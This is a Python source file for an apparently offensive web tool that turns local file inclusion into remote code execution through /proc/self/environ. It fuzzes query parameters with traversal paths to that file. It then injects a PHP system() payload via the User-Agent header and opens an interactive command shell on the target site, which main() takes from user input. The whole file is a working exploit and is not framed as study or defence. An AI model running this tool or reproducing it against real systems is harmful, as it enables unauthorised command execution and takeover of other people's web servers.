import re
import random
import string
import urllib.parse

from rich.progress import Progress

from core.base import BaseChecker


class EnvironChecker(BaseChecker):
    def __init__(self, url, depth=10, silent=False):
        super().__init__(url, silent)
        self.depth = depth
        self.return_filepath = None
        self.random_user_agent = self._generate_random_string()
        self.LFI_TEST_FILES = [
            ('/proc/self/environ', re.compile(fr'{self.random_user_agent}')),
        ]
        self.HTTP_HEADERS = [
            "HTTP_USER_AGENT",
            "HTTP_ACCEPT",
            "HTTP_ACCEPT_ENCODING",
            "HTTP_ACCEPT_LANGUAGE",
            "HTTP_REFERER",
            "HTTP_CONNECTION",
            "HTTP_COOKIE",
        ]

    def _generate_random_string(self, length=10):
        return ''.join(random.choice(string.ascii_letters) for _ in range(length))

    def environ_check(self):
        parsed_url = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed_url.query)
        file_paths = []

        for file_path, _ in self.LFI_TEST_FILES:
            for i in range(self.depth):
                file_paths.append(('../' * i + file_path, _))
                file_paths.append((urllib.parse.quote('../' * i + file_path), _))

        total_operations = len(params.keys()) * len(file_paths)

        if not self.silent:
            with Progress(console=self.console) as progress:
                return self._scan(params, file_paths, parsed_url, total_operations, progress)

        return self._scan(params, file_paths, parsed_url)

    def _scan(self, params, file_paths, parsed_url, total_operations=None, progress=None):
        task = progress.add_task("[cyan]Scanning...", total=total_operations) if progress else None

        headers = {'User-Agent': self.random_user_agent}

        for param_name in params.keys():
            for file_path, file_regex in file_paths:
                new_params = params.copy()
                new_params[param_name] = file_path
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))

                response = self._safe_get(fuzzed_url, headers=headers)
                if response is None:
                    return False, None

                if any(header in response.text for header in self.HTTP_HEADERS):
                    if file_regex.search(response.text):
                        self.return_filepath = file_path
                        if not self.silent:
                            self.console.print('\n[bold red]Possible LFI2RCE detected (proc_self_environ: method)[/bold red] (/proc/self/environ method)', style='bold red')
                        return True, param_name

                if progress:
                    progress.update(task, advance=1)

        return False, None

    def _build_shell_url(self, cmd, param_name):
        php_cmd = f"<?php echo '['; echo 'S]'; system('{cmd}'); echo '[E]';?>"
        parsed_url = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed_url.query)
        new_params = params.copy()
        new_params[param_name] = self.return_filepath
        new_query = urllib.parse.urlencode(new_params, doseq=True)
        fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
        return fuzzed_url, "POST", {"headers": {'User-Agent': php_cmd}}

    def run_shell(self, param_name):
        """Custom shell - injects commands via User-Agent header (POST)."""
        self.silent = True
        result, param_name = self.environ_check()

        if result:
            self._interactive_shell(param_name, self._build_shell_url)

        return None


def main():
    url = input('Enter site URL to test: ')
    checker = EnvironChecker(url, silent=True)
    output, param_name = checker.environ_check()

    if output is not None:
        checker.run_shell(param_name)


if __name__ == "__main__":
    main()
